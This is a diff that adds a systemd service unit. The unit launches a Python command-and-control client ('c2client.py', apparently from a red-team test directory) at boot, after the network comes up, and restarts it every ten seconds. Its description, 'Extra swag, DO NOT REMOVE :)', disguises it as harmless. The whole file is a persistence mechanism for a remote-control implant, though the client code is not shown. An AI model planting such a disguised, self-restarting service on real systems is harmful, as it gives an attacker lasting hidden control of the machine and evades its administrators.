@@ -1,0 +1,11 @@
+[Unit]
+Description=Extra swag, DO NOT REMOVE :)
+After=network.target
+
+[Service]
+ExecStart=/usr/bin/python3 /home/debian/redteamtest/c2client.py
+Restart=always
+RestartSec=10s
+
+[Install]
+WantedBy=multi-user.target
